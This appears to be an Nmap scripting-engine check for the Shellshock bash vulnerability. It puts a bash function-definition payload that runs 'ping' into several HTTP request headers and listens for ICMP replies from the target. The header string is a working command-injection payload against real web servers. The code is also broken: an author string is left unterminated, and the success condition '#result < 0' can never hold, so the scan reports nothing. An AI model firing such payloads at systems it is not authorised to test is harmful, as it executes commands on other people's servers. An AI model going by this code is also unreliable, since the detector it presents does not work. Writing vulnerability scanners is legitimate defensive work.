local http = require "http"
local nmap = require "nmap"
local packet = require "packet"
local shortport = require "shortport"
local stdnse = require "stdnse"

-- The Head Section --
description = [[
Checks if the webserver is vulnerable to shellshock. Based on http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html
]]
author = "Eric Gragsone <eric.gragsone@erisresearch.org>
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {'vuln','intrusive'}

-- The Rule Section --

prerule = function()
    if not nmap.is_privileged() then
        stdnse.print_verbose("%s not running due to lack of privileges.", SCRIPT_NAME)
        return false
    end
    return true
end

portrule = shortport.http

-- The Action Section --

local CallbackListen = function(interface, host, result)
    local condvar = nmap.condvar(result)
    local listener = nmap.new_socket()
    local filter = 'src host ' .. host.ip .. ' and icmp'
    local timeout = nmap.clock_ms() + (10000)
    local status, l3data, _

    listener:set_timeout(100)
    listener:pcap_open(host.interface, 1024, false, filter)

    while nmap.clock_ms() < timeout do
        status, _, _, l3data = listener:pcap_receive()
        if status then
          local p = packet.Packet:new(l3data, #l3data)
          table.insert(result, p)
        end
    end

    condvar("signal")
end

action = function(host, port)
    local result = {}
    local condvar = nmap.condvar(result)

    local options = { header={} }
    local interface = nmap.get_interface_info(host.interface)
    local cmd = '() { :; }; ping -c 3 ' .. interface.address

    options['header']['Cookie'] = cmd
    options['header']['Host'] = cmd
    options['header']['Referer'] = cmd
    options['header']['User-Agent'] = cmd

    http.get(host, port, '/', options)

    stdnse.new_thread(CallbackListen, interface, host, result)
    condvar("wait")

    if #result < 0 then
        return 'Success: Recieved ' .. table.getn(result) .. ' probes'
    end
end
